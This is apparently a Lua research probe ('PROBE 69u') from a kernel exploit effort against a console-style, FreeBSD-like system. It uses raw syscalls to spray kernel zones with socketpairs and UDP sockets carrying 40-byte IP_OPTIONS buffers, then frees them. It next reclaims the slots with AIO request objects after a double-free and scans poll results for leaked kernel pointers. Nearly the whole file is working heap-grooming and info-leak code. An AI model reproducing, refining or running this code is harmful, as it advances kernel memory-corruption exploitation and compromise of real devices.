-- CRASH_CLASS: MODERATE
-- PROBE 69u: Socketpair + IP_OPTIONS spray for AIO R-object zone reclaim
--
-- Context: Freed R-objects (48B) go to zone 0x1ab59e0. This probe creates
-- hundreds of socketpairs and sets IP_OPTIONS (40B) to trigger kernel
-- allocations that might land in the same zone. After the double-free,
-- we close sockets to free zone slots, then submit new AIO to check if
-- R-objects land on reclaimed socket metadata.
--
-- Also measures sys 624 delta for each spray type to calibrate zone hits.

print("=== PROBE 69u: SOCKETPAIR + IP_OPTIONS ZONE SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("FAIL"); return end

local function read_624()
    local ret = nil
    pcall(function() ret = mk(624)() end)
    return ret and N(ret) or 0
end

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one()
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    return rd(N(id_buf)) or 0
end

-- ============================================================
-- [A] 624 calibration: measure delta for each allocation type
-- ============================================================
print("")
print("[A] 624 calibration")

-- AIO submit
local c0 = read_624()
local cal_ids = {}
for i = 1, 20 do
    local id = submit_one()
    if id ~= 0 then table.insert(cal_ids, id) end
end
local c1 = read_624()
print(string.format("  20 AIO submits: delta=%d per_submit=%.1f", c1 - c0, (c1 - c0) / 20))

-- Socketpair
c0 = read_624()
local cal_svs = {}
for i = 1, 20 do
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
    end)
    local f0 = rd(N(sv)) or 0xFFFFFFFF
    if f0 ~= 0xFFFFFFFF then
        table.insert(cal_svs, {rd(N(sv)), rd(N(sv) + 4)})
    end
end
c1 = read_624()
print(string.format("  20 socketpairs: delta=%d per_pair=%.1f", c1 - c0, (c1 - c0) / 20))

-- EVF create
c0 = read_624()
local cal_evfs = {}
for i = 1, 20 do
    local name = put_str(string.format("cal_%d", i))
    local ret = nil
    pcall(function() ret = mk(538)(uint64(N(name)), uint64(i)) end)
    if ret and sgn(ret) >= 0 then table.insert(cal_evfs, sgn(ret)) end
end
c1 = read_624()
print(string.format("  20 EVFs: delta=%d per_evf=%.1f", c1 - c0, (c1 - c0) / 20))

-- namedobj create
c0 = read_624()
local cal_nobjs = {}
for i = 1, 20 do
    local name = put_str(string.format("cal_nobj_%04d_padpadpadpadpadpadpad", i))
    local ret = nil
    pcall(function() ret = mk(557)(uint64(N(name))) end)
    if ret and sgn(ret) >= 0 then table.insert(cal_nobjs, sgn(ret)) end
end
c1 = read_624()
print(string.format("  20 namedobjs: delta=%d per_obj=%.1f", c1 - c0, (c1 - c0) / 20))

-- UDP socket
c0 = read_624()
local cal_udps = {}
for i = 1, 20 do
    local s = sgn(mk(97)(uint64(2), uint64(2), uint64(0)))
    if s >= 0 then table.insert(cal_udps, s) end
end
c1 = read_624()
print(string.format("  20 UDP sockets: delta=%d per_sock=%.1f", c1 - c0, (c1 - c0) / 20))

-- IP_OPTIONS set
if #cal_udps > 0 then
    local opt = memory.alloc(44)
    for j = 0, 40, 4 do wd(N(opt) + j, 0xBEEF0000 + j) end
    c0 = read_624()
    for _, fd in ipairs(cal_udps) do
        pcall(function()
            mk(105)(uint64(fd), uint64(0), uint64(1), uint64(N(opt)), uint64(40))
        end)
    end
    c1 = read_624()
    print(string.format("  %d IP_OPTIONS sets: delta=%d per_set=%.2f",
        #cal_udps, c1 - c0, (c1 - c0) / #cal_udps))
end

if not alive() then print("DEAD"); return end

-- Cleanup calibration objects
for _, h in ipairs(cal_evfs) do pcall(function() mk(539)(uint64(h)) end) end
for _, h in ipairs(cal_nobjs) do pcall(function() mk(558)(uint64(h)) end) end
for _, sv in ipairs(cal_svs) do
    pcall(function() mk(6)(uint64(sv[1])) end)
    pcall(function() mk(6)(uint64(sv[2])) end)
end
for _, fd in ipairs(cal_udps) do pcall(function() mk(6)(uint64(fd)) end) end
-- Don't delete AIO cal_ids — leave them for later tests

-- ============================================================
-- [B] Heavy socketpair spray + close → AIO submit overlap test
-- ============================================================
print("")
print("[B] Socketpair spray/close → AIO overlap test")

-- Create 200 socketpairs
local spray_svs = {}
for i = 1, 200 do
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
    end)
    local f0 = rd(N(sv)) or 0xFFFFFFFF
    if f0 ~= 0xFFFFFFFF then
        table.insert(spray_svs, {rd(N(sv)), rd(N(sv) + 4)})
    end
end
print(string.format("  created %d socketpairs", #spray_svs))

-- Close them all (free zone slots)
for _, sv in ipairs(spray_svs) do
    pcall(function() mk(6)(uint64(sv[1])) end)
    pcall(function() mk(6)(uint64(sv[2])) end)
end
print("  closed all socketpairs")

-- Now submit AIO — do the R-objects land on freed socket zones?
local overlap_ids = {}
for i = 1, 32 do
    local id = submit_one()
    if id ~= 0 then table.insert(overlap_ids, id) end
end
print(string.format("  submitted %d AIO after close", #overlap_ids))

-- Poll and check for anomalies
if #overlap_ids > 0 then
    local np = memory.alloc(#overlap_ids * 4 + 8)
    local ns = memory.alloc(0x400)
    for j = 0, 0x3FC, 4 do wd(N(ns) + j, 0xCCCCCCCC) end
    for i = 1, #overlap_ids do
        wd(N(np) + (i - 1) * 4, overlap_ids[i])
    end

    pcall(function()
        mk(664)(uint64(N(np)), uint64(#overlap_ids), uint64(N(ns)))
    end)

    local anomalies = 0
    local kptrs = 0
    for j = 0, 0x3FC, 4 do
        local v = rd(N(ns) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            if v ~= 0 and v ~= 3 and v ~= 4 and v ~= 0xDEAD then
                anomalies = anomalies + 1
            end
            if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print(string.format("    KPTR at +0x%03X: 0x%08X", j, v))
            end
        end
    end
    print(string.format("  poll: anomalies=%d kptrs=%d", anomalies, kptrs))

    -- Also try 666 and 667
    for _, sc in ipairs({666, 667}) do
        for j = 0, 0x3FC, 4 do wd(N(ns) + j, 0xCCCCCCCC) end
        pcall(function()
            mk(sc)(uint64(N(np)), uint64(#overlap_ids), uint64(N(ns)))
        end)
        local sc_kptrs = 0
        local sc_mod = 0
        for j = 0, 0x3FC, 4 do
            local v = rd(N(ns) + j) or 0xCCCCCCCC
            if v ~= 0xCCCCCCCC then
                sc_mod = sc_mod + 1
                if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF then
                    sc_kptrs = sc_kptrs + 1
                    print(string.format("    %d KPTR at +0x%03X: 0x%08X", sc, j, v))
                end
            end
        end
        print(string.format("  %d: mod=%d kptrs=%d", sc, sc_mod, sc_kptrs))
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- [C] IP_OPTIONS targeted spray: exact 40B allocation
-- ============================================================
print("")
print("[C] IP_OPTIONS 40B spray → AIO overlap")

-- Create 300 UDP sockets with IP_OPTIONS set
local spray_udps = {}
local ip_opt = memory.alloc(44)
for j = 0, 40, 4 do wd(N(ip_opt) + j, 0xFACE0000 + j) end

for i = 1, 300 do
    local s = sgn(mk(97)(uint64(2), uint64(2), uint64(0)))
    if s >= 0 then
        pcall(function()
            mk(105)(uint64(s), uint64(0), uint64(1), uint64(N(ip_opt)), uint64(40))
        end)
        table.insert(spray_udps, s)
    end
end
print(string.format("  created %d UDP sockets with IP_OPTIONS", #spray_udps))

-- Close them to free the IP_OPTIONS buffers
for _, fd in ipairs(spray_udps) do
    pcall(function() mk(6)(uint64(fd)) end)
end
print("  closed all UDP sockets")

-- Submit more AIO
local ip_ids = {}
for i = 1, 16 do
    local id = submit_one()
    if id ~= 0 then table.insert(ip_ids, id) end
end
print(string.format("  submitted %d AIO after IP_OPTIONS close", #ip_ids))

if #ip_ids > 0 then
    local np = memory.alloc(#ip_ids * 4 + 8)
    local ns = memory.alloc(0x200)
    for j = 0, 0x1FC, 4 do wd(N(ns) + j, 0xCCCCCCCC) end
    for i = 1, #ip_ids do wd(N(np) + (i - 1) * 4, ip_ids[i]) end

    pcall(function()
        mk(664)(uint64(N(np)), uint64(#ip_ids), uint64(N(ns)))
    end)

    local kptrs = 0
    for j = 0, 0x1FC, 4 do
        local v = rd(N(ns) + j) or 0xCCCCCCCC
        if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
            kptrs = kptrs + 1
            print(string.format("    KPTR at +0x%03X: 0x%08X", j, v))
        end
    end
    print(string.format("  poll kptrs: %d", kptrs))
end

if not alive() then print("DEAD"); return end

print("")
print("[D] Summary")
print("  If 624 delta per IP_OPTIONS set > 0: IP_OPTIONS touches VM subsystem")
print("  If 624 delta per socketpair > 0: socket struct touches VM subsystem")
print("  Non-zero delta indicates same zone infrastructure as AIO R-objects")
print("  alive=" .. (alive() and "YES" or "NO"))

print("")
print("=== PROBE 69u COMPLETE ===")
